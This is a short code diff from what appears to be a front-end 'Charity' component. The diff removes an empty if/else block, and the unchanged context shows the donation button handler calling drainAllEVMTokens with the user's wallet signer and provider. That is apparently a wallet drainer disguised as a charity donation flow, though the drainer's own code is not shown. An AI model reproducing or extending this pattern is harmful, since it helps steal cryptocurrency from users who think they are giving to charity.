@@ -279,9 +279,6 @@ const Charity = () => {
         setButtonState('loading');
         const chainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-        } else {
-        }
         setButtonState('idle');
       } catch (error: any) {
         setButtonState('error');
